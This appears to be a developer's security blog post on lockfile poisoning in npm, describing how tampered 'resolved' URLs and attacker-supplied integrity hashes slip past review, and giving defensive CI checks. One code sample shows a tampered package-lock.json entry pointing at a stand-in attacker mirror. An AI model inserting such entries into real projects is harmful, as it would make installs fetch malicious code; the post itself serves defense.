---
title: "🔒 Lockfile Poisoning: The File You Trusted the Most Just Betrayed You"
date: "2026-07-03"
excerpt: "You pinned your dependencies. You committed the lockfile. You thought you were safe. Here's how attackers quietly rewrite package-lock.json and yarn.lock to point at malicious code — while every hash still 'checks out' at a glance."
tags:
  - security
  - supply-chain
  - npm
  - devops
  - cybersecurity
featured: true
---

Everyone tells you to commit your lockfile. "Reproducible builds!" "Pin your dependencies!" "Never trust semver ranges!" Great advice. I've given it myself.

Nobody tells you the follow-up: your lockfile is only as trustworthy as the last thing that touched it. And a *lot* of things touch it — CI bots, dependabot, that one contractor's laptop, a `postinstall` script from three dependencies deep. If any of them can slip in a modified `package-lock.json` before you review the diff, you've just pinned yourself to malware with mathematical precision.

This is lockfile poisoning, and it's sneakier than typosquatting because it doesn't rely on you making a typo. It relies on you trusting a file that looks boring enough nobody reads it in review.

## Why Lockfiles Are the Perfect Attack Surface

A `package.json` diff gets scrutinized — a new dependency, a version bump, someone will ask "wait, why do we need `left-pad-extreme` now?" But a `package-lock.json` diff? It's thousands of lines of resolved URLs, integrity hashes, and nested `node_modules` trees. Nobody reads that in a PR. Reviewers scroll past it or GitHub collapses it automatically because it's "a generated file."

That's exactly the property an attacker wants: a file that's authoritative for what actually gets installed, but socially exempt from review.

```json
// package-lock.json — a "small" tampered entry buried in 4,000 lines
"node_modules/left-pad": {
  "version": "1.3.0",
  "resolved": "https://attacker-mirror.example.com/left-pad/-/left-pad-1.3.0.tgz",
  "integrity": "sha512-9F3k2j...attacker-controlled-hash..."
}
```

Notice what's missing: the actual npm registry URL. If your install tooling doesn't strictly validate that `resolved` points at `registry.npmjs.org` (or your approved mirror), npm will happily fetch from `attacker-mirror.example.com` and verify it against the integrity hash the attacker *also* controls. The hash "matches" — because the attacker generated both the payload and the hash for it. Cryptographic integrity checking a value the attacker supplied is not integrity checking at all.

## The Three Ways Lockfiles Actually Get Poisoned

**1. Compromised CI identity.** If a bot account or CI token that auto-commits lockfile updates (renovate, dependabot, your own automation) gets compromised, the attacker doesn't need to touch your source code at all — they just quietly repoint one transitive dependency's `resolved` field during the next routine update PR.

**2. Malicious transitive publish.** A legitimately-owned but low-scrutiny package three levels deep in your tree gets a new version published by a compromised maintainer account (this is exactly what happened with `event-stream` in 2018 and `ua-parser-js` in 2021). Your lockfile then "correctly" pins to the poisoned version, because as far as npm's resolution logic is concerned, nothing is wrong — a legitimate maintainer published a legitimate-looking release.

**3. Lockfile regeneration drift.** Someone runs `npm install` locally with a stale or misconfigured `.npmrc` that resolves against a different registry than CI does, regenerates the lockfile, and commits it. Now your lockfile has entries resolving against a registry nobody explicitly approved — and it slides through review because the diff looks like routine dependency churn.

## Catching It Before It Ships

The fix isn't "read every lockfile line" — that doesn't scale and humans are bad at it anyway. The fix is making the tooling assert what a human can't reliably eyeball.

```bash
# Fail the build if any resolved URL isn't your approved registry
node -e '
  const lock = require("./package-lock.json");
  const allowed = "https://registry.npmjs.org/";
  const bad = Object.entries(lock.packages || {})
    .filter(([, pkg]) => pkg.resolved && !pkg.resolved.startsWith(allowed));
  if (bad.length) {
    console.error("Untrusted resolved URLs found:", bad.map(([name]) => name));
    process.exit(1);
  }
'
```

Wire that into a pre-merge CI check, not a local pre-commit hook — local hooks are exactly what an attacker with local access bypasses first.

Second layer: use `npm ci`, not `npm install`, everywhere except when you're deliberately updating dependencies. `npm ci` refuses to run if `package.json` and `package-lock.json` are out of sync, and it never rewrites the lockfile — it only ever installs exactly what's there. `npm install` will silently "fix" mismatches by regenerating parts of the lockfile, which is precisely the drift that lets a poisoned entry sneak in unnoticed.

```bash
# CI install step — deterministic, and errors loudly on drift
npm ci --ignore-scripts
```

Third, treat lockfile diffs in dependency-bump PRs as a distinct review category. At Cubet, we added a small CI gate that diffs the *set of resolved hosts* between lockfile versions on every PR that touches `package-lock.json`, and flags anything new for a manual look. It's a five-line script, but it turns "nobody reads the lockfile diff" into "something reads it, every time."

## The Uncomfortable Part

Lockfiles were built to solve non-determinism — "works on my machine" caused by unpinned transitive versions. They were never designed as a security boundary, and most teams treat them as one anyway, because "we committed the lockfile" *sounds* like a control. It's a reproducibility control, not a trust control. Reproducing a malicious install perfectly, every time, on every machine, is not a win.

If you want an actual trust boundary, you need registry allowlisting, install-script sandboxing, and someone (or something) actually looking at what changed in that 4,000-line file you've been scrolling past for two years.

---

Found a poisoned lockfile in the wild, or built a gate that catches this before it ships? Tell me about it — I'm [@iamanuragh](https://x.com/iamanuragh) on X. More posts like this at [iamanuragh.in](https://iamanuragh.in).
